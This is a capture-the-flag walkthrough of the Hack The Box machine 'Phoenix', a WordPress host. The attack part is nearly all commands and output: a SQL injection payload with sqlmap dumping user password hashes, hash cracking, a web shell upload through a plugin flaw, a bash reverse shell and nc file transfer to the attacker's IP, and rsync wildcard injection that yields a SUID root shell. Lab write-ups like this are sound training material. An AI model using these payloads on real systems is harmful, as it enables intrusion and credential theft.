# Phoenix
IP: 10.10.11.149

## Nmap
### All ports
```bash
$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.149

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

### Service Scan
```bash
$ sudo nmap -sC -sV -p22,80,443 10.10.11.149

Nmap scan report for phoenix.htb (10.10.11.149)
Host is up (0.32s latency).                                                  
                                                                             
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)           
| ssh-hostkey: 
|   3072 9d:f3:87:cd:34:75:83:e0:3f:50:d8:39:c6:a5:32:9f (RSA)
|   256 ab:61:ce:eb:ed:e2:86:76:e9:e1:52:fa:a5:c7:7b:20 (ECDSA)
|_  256 26:2e:38:ca:df:72:d4:54:fc:75:a4:91:65:cc:e8:b0 (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to https://phoenix.htb/
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
| tls-alpn: 
|   h2
|_  http/1.1
|_http-generator: WordPress 5.9
|_http-title: Phoenix Security &#8211; Securing the future.
| ssl-cert: Subject: commonName=phoenix.htb/organizationName=Phoenix Security Ltd./stateOrProvinceName=Arizona/countryName=US
| Not valid before: 2022-02-15T20:08:43
|_Not valid after:  2032-02-13T20:08:43
| http-robots.txt: 1 disallowed entry  
|_/wp-admin/
|_ssl-date: TLS randomness does not represent time
```

We can see that port 80 is redirecting to `https://phoenix.htb`. Lets add `phoenix.htb` dns entry to `/etc/hosts`:
```
10.10.11.149    phoenix.htb
```

## Port 443 - HTTPS
From the nmap scan I can see that it is running Wordpress v5.9. Lets run `wpscan` to enumerate some more:
```bash
$ wpscan --url https://phoenix.htb/ --enumerate ap,at,cb,dbe,u --disable-tls-checks
```

Bad decision! I got IP blocked!
![[phoenix/images/image1.png]]

Lets manually enumerate the website.
Looking at the home page source code I could spot some of the plugins metadata. One of them, asgaros-forum, even leak the the version installed:
![[phoenix/images/image2.png]]

Searched for known vulnerabilities and found an unauthenticated [SQL injection](https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1) for this plugin. To exploit is very easy, the syntax looks like this:
```
?subscribe_topic=1%20union%20select%201%20and%20sleep(10)
```

### Asgaros Forum SQL injection - WP plugin
From the main page we can access the forum at https://phoenix.htb/forum/.
Browsing to "[Members](https://phoenix.htb/forum/members/)" tab we get a list of possible users:
```
Phoenix - Administrator
Jack Thomson - User
Jane Logan - User
john - User
John Smith - User
```

We can test the SQL injection vulnerability sending the following GET request:
```
https://phoenix.htb/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(10)
```
And the browser received a response back from the server 10s later, confirming the SQL injection.

I will use SQLMap to automate the exploitation. First, I intercepted a request to the vulnerable URL with Burp:
```
GET /forum/?subscribe_topic=1 HTTP/2
Host: phoenix.htb
Cookie: asgarosforum_unique_id=6235797261801; asgarosforum_unread_cleared=1000-01-01%2000%3A00%3A00; asgarosforum_unread_exclude=a%3A1%3A%7Bi%3A1%3Bi%3A1%3B%7D
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
```

#### SQLMap
```bash
sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent --technique T
```

I'm using "--technique T" to use Time-Based techniques as we know it works from the POC.
SQLMap found the vulnerability:
```
sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
---
Parameter: subscribe_topic (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: subscribe_topic=1 AND (SELECT 4011 FROM (SELECT(SLEEP(5)))asIV)
---
[15:29:15] [INFO] the back-end DBMS is MySQL
```

We learned that the database is MySQL, we can add `--dbms=mysql` to the arguments so it goes faster.
Lets dump all the database names:
```
sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent --technique T --dbms=mysql --dbs

[15:34:15] [INFO] fetching database names
[15:34:15] [INFO] fetching number of databases
[15:34:15] [INFO] retrieved: 2
[15:34:30] [INFO] retrieved: information_schema
[15:39:41] [INFO] retrieved: wordpress
```

The process is going ***VERY*** slow.

Wordpress by default creates a table called `wp_users`. More info [here](https://codex.wordpress.org/Database_Description#Table:_wp_users).
Inside this table it is stored details of the users. I'm interested in `user_login` and `user_pass`:
```bash
sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent --technique T --dbms=mysql -D wordpress -T wp_users -C user_login,user_pass --dump

+------------+--------------------------------------------------+
| user_login | user_pass                                        |
+------------+--------------------------------------------------+
| john       | $P$B8eBH6QfVODeb/gYCSJRvm9MyRv7xz.               |
| Phoenix    | $P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc.               |
| caue       | $P$BFBRbXQMHfyEdMmAe8dH519SB/83jZ0 (password123) |
| Jane       | $P$BJCq26vxPmaQtAthFcnyNv1322qxD91               |
| Jsmith     | $P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G.               |
| Jack       | $P$BzalVhBkVN.6ii8y/nbv3CTLbC0E9e.               |
+------------+--------------------------------------------------+

```

#### Cracking hashes - Hashcat
Added the hashes into a file called `hashes.txt` and attempt to crack it:
```bash
$ hashcat -O -m 400 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
...

Phoenix:phoenixthefirebird14
Jsmith:superphoenix
john:password@1234
Jane:
Jack:
```

We got some passwords but no luck for Jane and Jack.

### Login in as Phoenix
Login using the administrator credentials `phoenix:phoenixthefirebird14` we are stopped by OTP:
![[phoenix/images/image3.png]]

I tried many ways of circunventing the OTP but nothing works.
At this point I decided to re-enumerate the plugins installed on wordpress. Maybe we can find some vulnerable plugins. Reading the source code of the home page I could get some of them:
```bash
$ curl -k https://phoenix.htb/ | grep plugins

https://phoenix.htb/wp-content/plugins/accordion-slider-gallery (v1.4)
https://phoenix.htb/wp-content/plugins/asgaros-forum (v1.15.13)
https://phoenix.htb/wp-content/plugins/photo-gallery-builder (v1.7)
https://phoenix.htb/wp-content/plugins/timeline-event-history (v1.6)
https://phoenix.htb/wp-content/plugins/pie-register (v3.7.2.6)
```

I looked for exploits but nothing really interesting.
Wordpress stores its active plugins register in the database. It is usually located in:
- Database: wordpress
- Table: wp_options
- Column/registry: active_plugins

So i decided to play with the SQL injection a bit more and dump the `wp_options` table to see what is in this registry:
```bash
$ sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent -D wordpress -T wp_options --dump

a:5:{i:0;s:89:"/srv/www/wordpress/../../../opt/wordpress/wp-content/plugins/asgaros-forum/skin/style.css";i:1;s:92:"/srv/www/wordpress/../../../opt/wordpress/wp-content/plugins/asgaros-forum/asgaros-forum.php";i:2;s:106:"/srv/www/wordpress/../../../opt/wordpress/wp-content/plugins/accordion-slider-gallery/accordion-slider.php";i:3;s:86:"/srv/www/wordpress/../../../opt/wordpress/wp-content/plugins/adminimize/adminimize.php";i:4;s:62:"/srv/www/wordpress/wp-content/themes/twentytwentyone/style.css";}
...[snip]...
download-from-files/download-from-files.php...
...[snip]...
```

It was dumping a lot of data and very, very, slow! But when I saw the plugin `download-from-files/download-from-files.php` being used I immediately searched for vulnerabilities on internet.

Found an exploit for Download From Files v1.48 (Arbitrary File Upload). [Exploit-DB link](https://www.exploit-db.com/exploits/50287).
Reading the exploit, it abuses of an arbitrary file upload vulnerability where the plugin allow an unauthenticated user to upload php4 and phtml files.
I will make a copy of [PownyShell](https://github.com/flozz/p0wny-shell) , change the file extension to `.phtml` and upload to the web server using the exploit.
```bash
~/htb/phoenix
❯ cp /opt/p0wny-shell/shell.php .

~/htb/phoenix
❯ mv shell.php shell.phtml   

~/htb/phoenix
❯ python3 file-upload.py https://phoenix.htb ./shell.phtml 
Download From Files <= 1.48 - Arbitrary File Upload
Author -> spacehen (www.github.com/spacehen)
Uploading Shell...
Shell Uploaded!
https://phoenix.htb/wp-admin/shell.phtml
```

Browsing to https://phoenix.htb/wp-admin/shell.phtml we get our semi-interactive webshell!
![[phoenix/images/image4.png]]

## Shell as wp_user
First of all, lets get a real tty. Start a netcat listener on our kali machine:
```bash
$ nc -lnvp 4444
```

Run a bash reverse shell from the webshell:
```
p0wny@shell:…/wordpress/wp-admin# bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'
```

### Upgrade tty
```bash
wp_user@phoenix:~/wordpress/wp-admin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z

❯ stty raw -echo;fg                    
[1]  + continued  nc -lnvp 4444

wp_user@phoenix:~/wordpress/wp-admin$ export TERM=xterm
```

### Escape OTP
Since we have some credentials extracted from the SQL injection I was trying to change user, however, the system would ask for a 2FA code:
```bash
wp_user@phoenix:~/wordpress/wp-admin$ su phoenix
Verification code:
```

I remember reading a blog article that recommended looking at where is the 2FA implemented. Sometimes it only asks for 2FA in a specific service or IP. Looking at the access configuration file I saw that it would allow access from the network `10.11.12.13/24`. So probably we can circunvent the 2FA.
```bash
wp_user@phoenix:~$ cat /etc/security/access-local.conf                                                                                                        
+ : ALL : 10.11.12.13/24                                                                                                                                      
- : ALL : ALL
```

Running `ifconfig` revealed we are connected to that subnet via `eth0`:
```bash
wp_user@phoenix:~$ ifconfig                                                                                                                                   
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                                                                                  
        inet 10.10.11.149  netmask 255.255.254.0  broadcast 10.10.11.255                                                                                      
        inet6 fe80::250:56ff:feb9:954c  prefixlen 64  scopeid 0x20<link>                                                                                      
        inet6 dead:beef::250:56ff:feb9:954c  prefixlen 64  scopeid 0x0<global>                                                                                
        ether 00:50:56:b9:95:4c  txqueuelen 1000  (Ethernet)                                                                                                  
        RX packets 82501  bytes 11605905 (11.6 MB)                                                                                                            
        RX errors 0  dropped 37  overruns 0  frame 0                                                                                                          
        TX packets 44365  bytes 39835719 (39.8 MB)                                                                                                            
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=195<UP,BROADCAST,RUNNING,NOARP>  mtu 1500
        inet 10.11.12.13  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::607c:42ff:fe5b:cd05  prefixlen 64  scopeid 0x20<link>
        ether 62:7c:42:5b:cd:05  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 989  bytes 73122 (73.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## SSH shell as editor
Lets SSH in to that network. I tried some credentials and the one that work was `editor:superphoenix`.
```
wp_user@phoenix:~$ ssh editor@10.11.12.13                                                                                                                     
The authenticity of host '10.11.12.13 (10.11.12.13)' can't be established.                                                                                    
ECDSA key fingerprint is SHA256:UFrZTjBNH3KNUbtCeiCkYGUImlWztCyRUVcMDDkKeu4.                                                                                  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.12.13' (ECDSA) to the list of known hosts.
$$$$$$$\  $$\                                     $$\           
$$  __$$\ $$ |                                    \__|          
$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\ 
$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |
$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  / 
$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$<  
$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\ 
\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|
Password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)

editor@phoenix:~$
```

### Backup files
Enumerating the machine I see some interesting files in the `/backups` directory:
```bash
editor@phoenix:/backups$ ls -la
total 2000
drwxr-x---  2 editor editor   4096 Mar 21 00:03 .
drwxr-xr-x 20 root   root     4096 Feb 25 19:40 ..
-rw-r--r--  1 root   root   678549 Mar 20 23:57 phoenix.htb.2022-03-20-23-57.tar.gz
-rw-r--r--  1 root   root   678548 Mar 21 00:00 phoenix.htb.2022-03-21-00-00.tar.gz
-rw-r--r--  1 root   root   678547 Mar 21 00:03 phoenix.htb.2022-03-21-00-03.tar.gz
```

It seems that the system is creating a file every 3 minutes. I will transfer the oldest one to my machine for a closer look:
```bash
❯ nc -l -p 1234 > phoenix.htb.2022-03-20-23-57.tar.gz
...
editor@phoenix:/backups$ nc -w 3 10.10.14.2 1234 < phoenix.htb.2022-03-20-23-57.tar.gz
```

Decompress it:
```
❯ tar -xvzf phoenix.htb.2022-03-20-23-57.tar.gz    
dbbackup.sql
tar: dbbackup.sql: time stamp 2022-03-21 07:57:01 is 163.536085848 s in the future
```

Looking at the contents of the file I notice it is a backup of the mysql database.
But how this is happening? I tried running `pspy` to monitor the processes running but no luck! Enumerated the cronjobs and got nothing!

Decided to go deeper in enumerating the machine when I found an interesting binary in the `/usr/local/bin` directory:
```bash
editor@phoenix:/usr/local/bin$ ls -la
total 24
drwxr-xr-x  2 root root  4096 Feb 13 20:11 .
drwxr-xr-x 10 root root  4096 Jul 31  2020 ..
-rwxr-xr-x  1 root root 15392 Feb 16 22:27 cron.sh.x
```

It is a binary and I cannot read it in plain-text. So I setup another tty with `pspy` running and executed the binary to see what is doing:
![[phoenix/images/image6.png]]

### Rsync privilege escalation
The most interesing things to note above are:
- It is changing directory to `/backups`
- Running `rsync` to every file in the directory (probably using wildcard)

Looking at [Hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks) I could spot our privilege escalation path!
The idea is to inject code since `rsync` might be using a wildcard to get all the file names.
We can create a file that will add an argument to the `rsync` command and execute a bash script. The file `shell.sh` will make a copy of bash and set the SUID permissions to it.
```bash
editor@phoenix:/backups$ echo 'cp /usr/bin/bash /tmp/rootbash;chmod +s /tmp/rootbash' > shell.sh
editor@phoenix:/backups$ chmod +x shell.sh
editor@phoenix:/backups$ touch "/backups/-e sh shell.sh"
```

The `/backups` directory should look like this. Now we just wait for the cronjob:
![[phoenix/images/image7.png]]

And here it is, we have a copy of  `bash` with the SUID bit:
![[image8.png]]

Lets get a root shell:
```bash
editor@phoenix:/tmp$ ./rootbash -p

rootbash-5.0$ id
uid=1002(editor) gid=1002(editor) euid=0(root) egid=0(root) groups=0(root),1002(editor)

rootbash-5.0$ cd /root
rootbash-5.0$ ls -la
total 128
drwx------  8 root root  4096 Feb 25 19:40 .
drwxr-xr-x 20 root root  4096 Feb 25 19:40 ..
-rwxr-xr-x  1 root root   142 Feb 13 20:16 adapter.sh
lrwxrwxrwx  1 root root     9 Nov 13 10:41 .bash_history -> /dev/null
drwx------  2 root root  4096 Feb 25 15:07 .cache
drwx------  4 root root  4096 Feb 25 15:07 .config
-rw-r--r--  1 root root   275 Feb 16 22:27 cron.sh
-rwxrwxr-x  1 root root 15392 Feb 16 22:27 cron.sh.x
-rw-r--r--  1 root root 18960 Feb 16 22:27 cron.sh.x.c
drwxr-xr-x  3 root root  4096 Feb 25 15:07 .local
lrwxrwxrwx  1 root root     9 Nov 13 10:45 .mysql_history -> /dev/null
lrwxrwxrwx  1 root root     9 Feb 25 13:21 .python_history -> /dev/null
-rw-r-----  1 root root    33 Mar 20 23:58 root.txt
drwx------  2 root root  4096 Feb 25 15:07 .ssh
drwxr-xr-x  3 root root  4096 Feb 25 15:07 .subversion
drwxr-xr-x  2 root root  4096 Feb 25 15:07 .vim
-rw-r--r--  1 root root 49006 Nov 25 12:29 .zcompdump
```